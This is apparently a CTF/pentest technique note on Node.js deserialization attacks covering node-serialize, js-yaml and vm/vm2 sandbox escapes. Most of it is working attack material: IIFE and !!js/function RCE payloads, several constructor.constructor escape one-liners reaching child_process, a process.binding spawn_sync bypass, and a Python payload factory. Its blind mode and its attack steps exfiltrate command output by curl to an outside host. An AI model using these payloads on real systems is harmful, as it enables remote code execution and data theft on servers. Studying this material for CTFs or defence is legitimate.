---
title: "Node.js Deserialization - node-serialize, js-yaml and vm/vm2 Sandbox Escape"
category: web
subcategory: nodejs
type: technique
tags: [nodejs, node-serialize, deserialization, js-yaml, yaml-load, eval, function-constructor, vm, vm2, sandbox-escape, child-process, execsync, process-mainmodule, prototype, unserialize, funcster, cryo, rce]
difficulty: medium
summary: "node-serialize runs an IIFE on load, js-yaml <3.13 builds functions, and vm/vm2 sandboxes escape to the host realm via constructor.constructor to reach child_process."
when_to_use:
  - "A cookie/param base64-decodes to JSON containing _$$ND_FUNC$$_"
  - "yaml.load / js-yaml on user input, or a version pinned below 3.13"
  - "Code runs user JS in vm.runInNewContext / vm2 and you must escape the sandbox"
  - "unserialize(), cryo, funcster, or a require() with a user-controlled path"
tools: [node, burp, python3]
related: [proto-pollution, node-parameter-pollution, node-cors-postmessage-websocket, deser-python-pickle]
---

## TL;DR

`node-serialize` and friends serialize functions as strings and rebuild them with the `Function`
constructor -- append `()` and the function is *invoked* on load, giving RCE. `js-yaml` before
3.13 evaluates `!!js/function`. Anything running user JS in `vm`/`vm2` is escapable because a
sandboxed object's `constructor.constructor` is the host realm's `Function`, which reaches
`process` and `child_process`.

## Recognise it

- A cookie/token that base64-decodes to JSON with `"$$ND_FUNC$$"` / `_$$ND_FUNC$$_`.
- `require('node-serialize')`, `serialize-to-js`, `cryo`, `funcster` in `package.json`.
- `yaml.load(userInput)` (unsafe pre-4.0 / js-yaml pre-3.13) vs `yaml.safeLoad`.
- `vm.runInNewContext`, `vm.runInThisContext`, `new vm.Script`, `require('vm2')`.
- `eval(`, `new Function(`, `setTimeout(str)`, `setInterval(str)`, `Function(str)()`.
- `require(req.query.x)`, `require('./'+userInput)` -- path-traversal to a JS file you uploaded.
- Express session with a custom serializer, or a `secret`-signed cookie that is then parsed.

## Theory

### node-serialize IIFE injection

`node-serialize` stores a function as `{"f":"_$$ND_FUNC$$_function(){...}"}`. On
`unserialize()` it detects the `_$$ND_FUNC$$_` marker and does `eval('(' + body + ')')`, which
*defines* the function but does not call it. Turn definition into execution with a trailing
`()` -- an Immediately-Invoked Function Expression:

```
_$$ND_FUNC$$_function(){ require('child_process').execSync('id'); }()
```

The trailing `()` is the whole trick: without it, RCE only fires if the app later calls the
property; with it, `eval` runs your body during `unserialize()` itself.

### js-yaml `!!js/function`

Before 3.13.0, the default schema included `!!js/function`, `!!js/regexp` and `!!js/undefined`.
`yaml.load` (which was the unsafe default before 4.0) instantiates them:

```yaml
"exploit": !!js/function >
  function () { require('child_process').execSync('id'); }
```

`yaml.load` with the default schema builds the function; whether it fires depends on the app
touching it, so pair it with a toString/valueOf trigger or a schema that self-invokes.

### The sandbox-escape primitive

`vm.runInNewContext(code, sandbox)` runs `code` with `sandbox` as its global. `require`,
`process` and `module` are *not* in the sandbox -- but primitive prototypes are shared with the
host in the base `vm` module. So from inside the sandbox:

```js
this.constructor.constructor('return process')()
```

`this.constructor` is `Object`, `Object.constructor` is `Function` **from the host realm**, and
calling it compiles code in the host context where `process` is global. From `process`:

```js
process.mainModule.require('child_process').execSync('id').toString()
```

Alternative walks to the host `Function`:

```js
// via an anonymous function
(function(){}).constructor("return process")().mainModule.require("child_process").execSync("id")
// via an array literal
[].constructor.constructor("return process")()
// via an error object caught in the sandbox
try { null.x } catch (e) { e.constructor.constructor("return process")() }
// via arguments (older engines)
arguments.callee.caller
```

`vm` is explicitly *not* a security boundary (the Node docs say so). `vm2` tried to be one by
freezing prototypes and proxying host objects; its escapes (the CVE-2023-29017 /
CVE-2023-32314 / CVE-2023-37466 family) work by obtaining a genuine *host* object -- typically
an `Error` whose stack is formatted by a host `Error.prepareStackTrace` callback, or a value
leaked through a Proxy trap -- and then walking `.constructor.constructor` on that host object,
which is outside the frozen sandbox prototypes. vm2 is unmaintained; treat any vm2 challenge as
escapable.

### When child_process is blocked

```js
// spawn_sync binding, bypasses a deleted require('child_process')
process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{},{type:'pipe',readable:false,writable:true},{}]})
// read a file without RCE
process.binding('fs')            // low-level fs
process.env                      // often holds the flag / secrets
global.process.mainModule.require('fs').readFileSync('/flag').toString()
```

### Other Node deserialization sinks

- **`cryo`** and **`funcster`** rebuild functions the same way as node-serialize.
- **`serialize-to-js`** `deserialize()` has the same function-string behaviour.
- **`JSON.parse(x, reviver)`** with a reviver that walks into `__proto__` -> see `proto-pollution`.
- **`require(userInput)`** -- upload/write a `.js` file, then `require('/tmp/x')` or
  `require('../../../tmp/x')`. Node appends `.js`, so `../../etc/passwd` needs a `.js` sibling.
- **Express signed cookies** parsed into a serializer, or a custom session store using
  node-serialize.

## Attack

1. Decode the token; if you see `_$$ND_FUNC$$_`, build a node-serialize IIFE payload.
2. If it is YAML, check the js-yaml version; if < 3.13 (or `yaml.load` on 3.x default), use
   `!!js/function`.
3. If code runs in `vm`/`vm2`, submit a sandbox-escape one-liner via `constructor.constructor`.
4. Blind? Use `execSync('curl http://h/`id|base64`')` or `execSync('sleep 7')`.
5. child_process blocked? `process.binding('spawn_sync')` or read the flag via `fs` binding.

## Code

```python
#!/usr/bin/env python3
"""Node.js deserialization payload factory.

Builds node-serialize IIFE payloads and js-yaml !!js/function payloads for a
chosen command, in raw / base64 / url-encoded forms. Self-tests the payload
shapes offline (no Node required).
"""
from __future__ import annotations

import base64
import json
import sys
import urllib.parse

FUNC_MARKER = "_$$ND_FUNC$$_"


def js_body(cmd: str, blind_host: str | None = None) -> str:
    if blind_host:
        inner = "require('child_process').execSync('curl http://%s/'+" \
                "require('child_process').execSync(%s).toString('base64'))" \
                % (blind_host, json.dumps(cmd))
        return "function(){%s}" % inner
    return ("function(){return require('child_process')"
            ".execSync(%s).toString()}" % json.dumps(cmd))


def node_serialize_payload(cmd: str, prop: str = "rce",
                           blind_host: str | None = None) -> str:
    """node-serialize object; the trailing () makes it fire on unserialize()."""
    body = js_body(cmd, blind_host)
    # the trailing () is the IIFE that turns "define" into "invoke"
    value = FUNC_MARKER + body + "()"
    return json.dumps({prop: value})


def js_yaml_payload(cmd: str) -> str:
    """js-yaml < 3.13 (or yaml.load default) !!js/function."""
    return ('"exploit": !!js/function >\n'
            '  function () { require("child_process").execSync(%s); }\n'
            % json.dumps(cmd))


def vm_escape(cmd: str, variant: str = "this") -> str:
    """A sandbox-escape expression for vm/vm2."""
    call = ("process.mainModule.require('child_process').execSync(%s).toString()"
            % json.dumps(cmd))
    walks = {
        "this": "this.constructor.constructor('return process')()",
        "func": "(function(){}).constructor('return process')()",
        "array": "[].constructor.constructor('return process')()",
        "error": "(()=>{try{null.x}catch(e){return e.constructor.constructor"
                 "('return process')()}})()",
    }
    return walks[variant] + "." + call.split(".", 1)[1]


def encode(payload: str, how: str = "raw") -> str:
    if how == "raw":
        return payload
    if how == "b64":
        return base64.b64encode(payload.encode()).decode()
    if how == "url":
        return urllib.parse.quote(payload, safe="")
    if how == "b64url":
        return urllib.parse.quote(base64.b64encode(payload.encode()).decode(),
                                  safe="")
    raise ValueError(how)


def _self_test() -> None:
    # node-serialize payload has the marker and the trailing IIFE ()
    p = node_serialize_payload("id")
    obj = json.loads(p)                       # must be valid JSON
    assert FUNC_MARKER in obj["rce"]
    assert obj["rce"].rstrip().endswith("()"), "missing IIFE invocation"
    assert "execSync" in obj["rce"] and "child_process" in obj["rce"]

    # blind variant embeds a callback host
    pb = node_serialize_payload("id", blind_host="10.0.0.1:9000")
    assert "10.0.0.1:9000" in json.loads(pb)["rce"]

    # js-yaml payload uses the dangerous tag
    y = js_yaml_payload("id")
    assert "!!js/function" in y and "child_process" in y

    # every vm-escape variant reaches process + child_process
    for v in ("this", "func", "array", "error"):
        e = vm_escape("id", v)
        assert "constructor" in e and "child_process" in e and "execSync" in e, v

    # encodings round-trip
    assert base64.b64decode(encode(p, "b64")).decode() == p
    assert urllib.parse.unquote(encode(p, "url")) == p
    assert urllib.parse.unquote(base64.b64decode(
        urllib.parse.unquote(encode(p, "b64url"))).decode()) == p

    # command is JSON-escaped so quotes/spaces survive
    q = node_serialize_payload("cat /flag; echo \"done\"")
    assert json.loads(q)["rce"]                # parses cleanly despite the quotes

    print("[ok] node-serialize + js-yaml + %d vm-escape variants verified" % 4)


def main() -> int:
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    print("# node-serialize (base64 cookie):")
    print(encode(node_serialize_payload(cmd), "b64"))
    print("\n# js-yaml:")
    print(js_yaml_payload(cmd))
    print("# vm escape:")
    print(vm_escape(cmd))
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

Vulnerable server and each escape, in JavaScript:

```javascript
// vuln-node-serialize.js
const serialize = require('node-serialize');
require('http').createServer((req, res) => {
  const c = (req.headers.cookie || '').split('profile=')[1];
  if (c) serialize.unserialize(Buffer.from(c, 'base64').toString());  // RCE
  res.end('ok');
}).listen(3000);
// payload cookie (base64 of):
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

```javascript
// vuln-vm.js  -- "safe" calculator that is not safe
const vm = require('vm');
const out = vm.runInNewContext(userInput, Object.create(null));
// escape submitted as userInput:
// this.constructor.constructor('return process')()
//   .mainModule.require('child_process').execSync('id').toString()
```

```javascript
// vuln-jsyaml.js
const yaml = require('js-yaml');           // < 3.13
yaml.load(userInput);                      // !!js/function fires
```

## Variants & pitfalls

- **The trailing `()`**: forget it and node-serialize only defines the function -- no execution
  unless the app calls the property later. Some challenges call it, most do not.
- **`execSync` blocks the event loop**; for a long command use `exec` with a callback or fire a
  reverse shell that detaches.
- **`this` may be null** in strict-mode sandboxes -- use the `(function(){}).constructor` or
  array-literal walk instead.
- **vm2 version matters**: pre-3.9.16 falls to `Error.prepareStackTrace`; the exact escape is
  version-specific. Any vm2 is exploitable given the right public PoC.
- **`Object.create(null)` sandbox** removes `this.constructor`; pivot through a passed-in object,
  a literal (`[]`, `{}`, `""`), or a thrown error.
- **js-yaml >= 3.13 / 4.x**: `!!js/function` removed from the default schema; `load` is safe in
  4.x. You need `DEFAULT_FULL_SCHEMA` or an explicitly unsafe call.
- **Base64 vs JSON quoting**: the payload contains quotes; keep it valid JSON before encoding or
  `unserialize()` throws before reaching your function.
- **`require(userInput)` needs a `.js` file** that Node can resolve; a null byte will not
  truncate the extension on modern Node.
- **child_process removed from the require cache**: `process.binding('spawn_sync')` still works;
  so does re-`require`ing by absolute path.
- **Read-only flag challenges**: skip RCE, dump `process.env` or `fs.readFileSync('/flag')`.

## Tools

- `node -e "require('node-serialize').unserialize(process.argv[1])" '<payload>'` to test locally.
- Burp Decoder for the base64 cookie layer.
- `js-yaml` CLI to confirm a version's schema behaviour.

## References

- Node.js documentation -- `vm` module ("The vm module is not a security mechanism").
- OpenSecurity / Ajin Abraham -- "Exploiting Node.js deserialization bug for RCE" (node-serialize).
- js-yaml CHANGELOG -- 3.13.0 security fix, 4.0 default-safe `load`.
- Snyk / GitHub advisories -- vm2 sandbox escape series (CVE-2023-29017, 32314, 37466).
- PayloadsAllTheThings -- Node.js deserialization / sandbox escape.
